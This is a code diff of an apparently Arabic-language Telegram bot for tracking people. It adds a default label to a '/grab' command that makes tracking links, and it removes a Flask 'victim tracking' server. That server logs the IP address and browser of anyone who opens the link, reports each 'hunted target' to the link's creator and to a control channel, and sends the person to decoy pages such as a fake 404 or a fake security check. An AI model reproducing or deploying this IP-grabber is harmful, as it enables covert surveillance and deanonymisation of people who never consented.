@@ -37,7 +37,8 @@ IPINFO_TOKEN   = os.getenv("IPINFO_TOKEN", "")
 VIRUSTOTAL_KEY = os.getenv("VIRUSTOTAL_KEY", "")
 DEHASHED_KEY   = os.getenv("DEHASHED_KEY", "")
 
-BOT_SERVER_URL = os.getenv("BOT_SERVER_URL", "https://bot-ai-7vzq.onrender.com")
+_raw_domain    = os.getenv("REPLIT_DOMAINS", "").split(",")[0].strip()
+BOT_SERVER_URL = f"https://{_raw_domain}" if _raw_domain else ""
 
 # ذاكرة المحادثة لكل مستخدم
 chat_memory: dict[int, list] = defaultdict(list)
@@ -544,7 +545,7 @@ def build_main_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
 WELCOME_TEXT = (
     "```\n"
     "╔══════════════════════════════╗\n"
-    "║   ⚡  راشد الاستخباراتي  ⚡   ║\n"
+    "║   ⚡  راشد الاستخباراتي  ⚡  ║\n"
     "║      نظام الذكاء v2.0        ║\n"
     "╚══════════════════════════════╝\n"
     "```\n"
@@ -659,13 +660,10 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if not context.args:
-        await update.message.reply_text(
-            "📌 الاستخدام: `/grab <تسمية>`\n\nمثال: `/grab MyLink`",
-            parse_mode="Markdown",
-        )
-        return
-    label = " ".join(context.args)
+    if context.args:
+        label = " ".join(context.args)
+    else:
+        label = f"Link_{datetime.now().strftime('%H%M%S')}"
     pending_grabs[user.id] = label
     kb = InlineKeyboardMarkup([
         [
@@ -977,79 +975,8 @@ def main():
     print(f"🤖 البوت: {MAIN_BOT_TOKEN.split(':')[0]}")
     print(f"🌐 الخادم: {BOT_SERVER_URL}")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    app.run_polling(drop_pending_updates=True)
 
-    return app  
-
-
-import threading
-from flask import Flask
-import os
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🌐  خادم التتبع واستقبال الضحايا (Flask Engine)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-from flask import Flask, request
-import threading
-
-app_web = Flask(__name__)
-
-@app_web.route('/')
-def home():
-    return "⚡ Rashd AI: System is Online and Monitoring!"
-
-@app_web.route('/track/<user_id>/<session_id>/<page_type>')
-def track_victim(user_id, session_id, page_type):
-    """المحرك المسؤول عن سحب بيانات الضحية عند فتح الرابط"""
-    try:
-        # 1. جمع معلومات الجهاز والـ IP
-        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
-        user_agent = request.headers.get('User-Agent', 'Unknown')
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        # 2. تجهيز رسالة التقرير
-        report = (
-            "🔔 *راشد — تم اصطياد هدف جديد!*\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 المستهدف (صاحب الرابط): `{user_id}`\n"
-            f"🏷️ الجلسة: `{session_id}`\n"
-            f"🖼️ نوع الصفحة: {page_type}\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🌐 عنوان الـ IP : `{ip_addr}`\n"
-            f"📱 الجهاز/المتصفح: `{user_agent}`\n"
-            f"🕐 الوقت المحلي : {timestamp}\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            "📍 *ملاحظة:* استخدم أمر `/ip` مع العنوان أعلاه للحصول على الخريطة."
-        )
-
-        # 3. إرسال النتيجة لصاحب الرابط (عبر البوت الرئيسي أو بوت التتبع)
-        # سنرسلها لقناة المراقبة وللمستخدم نفسه
-        _tg_post(MAIN_BOT_TOKEN, user_id, report)
-        _tg_post(MAIN_BOT_TOKEN, CONTROL_CHANNEL_ID, f"🎯 تم سحب IP جديد بواسطة مستخدم: {user_id}")
-
-        # 4. توجيه الضحية لصفحة وهمية بناءً على نوع الرابط
-        if page_type == "news":
-            return "<html><script>window.location.href='https://www.aljazeera.net';</script></html>"
-        elif page_type == "download":
-            return "<h3>File not found (404)</h3><p>The requested document is no longer available on this server.</p>"
-        elif page_type == "verify":
-            return "<h2>Security Verification</h2><p>Your IP has been verified. You may close this page.</p>"
-        else:
-            return "⚡ System Verified."
-
-    except Exception as e:
-        return f"Error: {str(e)}", 500
-
-def run_web():
-    # تشغيل الخادم على بورت Render
-    port = int(os.environ.get("PORT", 10000))
-    app_web.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
-
-def run_bot():
-    bot_app = main()
-    bot_app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
-    # تشغيل خادم التتبع في الخلفية
-    threading.Thread(target=run_web, daemon=True).start()
-    # تشغيل البوت الرئيسي
-    run_bot()
+    main()
